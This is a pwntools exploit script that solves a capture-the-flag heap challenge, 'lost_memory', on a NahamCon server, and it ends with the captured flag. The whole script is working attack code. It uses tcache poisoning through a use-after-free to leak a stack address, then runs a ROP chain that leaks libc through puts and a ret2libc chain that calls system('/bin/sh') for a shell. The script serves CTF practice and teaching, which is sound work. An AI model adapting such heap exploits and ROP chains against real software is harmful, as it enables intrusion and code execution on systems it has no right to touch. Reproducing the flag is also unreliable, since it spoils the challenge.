from pwn import *

# obviously UAF also have a free stack leak -> ropchain

exe = ELF("./lost_memory_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

def malloc(size):
    p_sla(b"choice:\n", b"1")
    p_sla(b"like?\n", f"{size}".encode())

def write(data):
    p_sla(b"choice:\n", b"2")
    p_sla(b"write?\n", data)

def select(index):
    p_sla(b"choice:\n", b"3")
    p_sla(b"- 9)\n", f"{index}".encode())

def free():
    p_sla(b"choice:\n", b"4")

def stored():
    p_sla(b"choice:\n", b"5")

script = '''
b *vuln
b *0x40175A
'''

p = remote("challenge.nahamcon.com", 32648)
#p = process("./lost_memory_patched")
#debug()

# tcache poisoning
malloc(0x48)
select(1)
malloc(0x48)
free()
select(0)
free()
stored()

p_recvut(b"return value: ")
rbp = int(p.recvline(), 16) + 0x18
print(hex(rbp))

malloc(0x48)
malloc(0x48)

pop_rdi = 0x000000000040132e
ret = pop_rdi + 1
pop_rsi = 0x0000000000401330
pop_rdx = 0x0000000000401334
puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
fgets_plt = exe.plt['fgets']
vuln = exe.symbols['vuln']

# ROP chain
# leak libc && ret2main
rop = [
p64(pop_rdi), p64(puts_got),
p64(puts_plt), p64(vuln),
]
rop = b"A" * 0x20 + b"".join(rop)
write(rop)

p_sla(b"choice:\n", b"6")
p.recvuntil(b"Exiting...\n")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['puts']
print(hex(libc_base))

# tcache poisoning again (0x50 tcache now is crash, dont use it)
malloc(0x58)
select(1)
malloc(0x58)
free()
select(0)
free()
stored()
malloc(0x58)
malloc(0x58)

# ROP chain
# ret2libc
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
rop = [
p64(pop_rdi), p64(binsh),
p64(ret), p64(system),
]
rop = b"B" * 0x20 + b"".join(rop)
write(rop)

p_sla(b"choice:\n", b"6")

p.interactive()
#flag{2658c992bda627329ed2a8e6225623c6}